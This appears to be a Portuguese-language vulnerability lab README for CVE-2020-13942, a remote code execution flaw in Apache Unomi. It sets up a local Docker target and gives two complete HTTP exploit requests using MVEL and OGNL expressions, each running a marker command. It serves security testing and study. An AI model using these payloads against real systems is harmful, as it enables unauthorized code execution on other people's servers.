# Apache Unomi Remote Express Language Code Execution (CVE-2020-13942)

Apache Unomi é uma plataforma de dados de clientes Java Open Source, um servidor Java projetado para gerenciar clientes, leads e dados de visitantes e ajudar a personalizar as experiências dos clientes.

Nas versões anteriores a 1.5.1, o Apache Unomi permitia que atacantes remotos enviassem solicitações maliciosas com expressões MVEL e OGNL que poderiam conter classes arbitrárias, resultando em Remote Code Execution (RCE) com os privilégios do aplicativo Unomi.

## Configuração do ambiente

Execute os seguintes comandos para iniciar um servidor Apache Unomi 1.5.1:

```
docker-compose up -d
```

Após o ambiente ser iniciado, você pode acessar a API do Unomi através de `http://your-ip:8181` ou `https://your-ip:9443`.

## Reprodução de vulnerabilidade

A vulnerabilidade pode ser acionada por meio das portas 8181 e 9443.

Execute comandos arbitrários por meio de expressões MVEL:

```
POST /context.json HTTP/1.1
Host: localhost:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 483

{
    "filters": [
        {
            "id": "sample",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "sample"
}
```

Execute comandos arbitrários por meio de expressões OGNL:

```
POST /context.json HTTP/1.1
Host: localhost:8181
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 1064

{
  "personalizations":[
    {
      "id":"gender-test",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))",
                  "comparisonOperator":"equals",
                  "propertyValue":"male"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
  ],
  "sessionId":"sample"
}
```

Entre no container Docker, você pode ver que o comando foi executado com sucesso:

![](1.png)
